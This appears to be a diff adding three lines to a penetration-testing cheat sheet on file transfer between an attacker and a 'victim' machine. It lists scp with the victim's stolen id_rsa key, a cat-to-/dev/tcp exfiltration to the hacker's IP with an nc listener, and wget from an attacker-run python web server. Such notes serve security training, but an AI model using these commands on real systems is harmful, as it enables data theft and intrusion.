@@ -1,0 +1,3 @@
+- `scp -i {KEY_FILE} {USER}@{IP}:{FILE_PATH} {LOCAL_PATH}` - This way can be used when you've the id_rsa of the victim's machine
+- `cat < {FILE} > /dev/tcp/{HACKER'S IP}/{PORT}` while `nc -lvnp {PORT} > {DESIRED NAME}` - This way can be used when the machine doesn't have much tools.
+- `wget http://{HACKER IP}/{FILE}` while `python -m http.server 80` in the file's directory - This can be used when the victim's machine has wget or python respectively
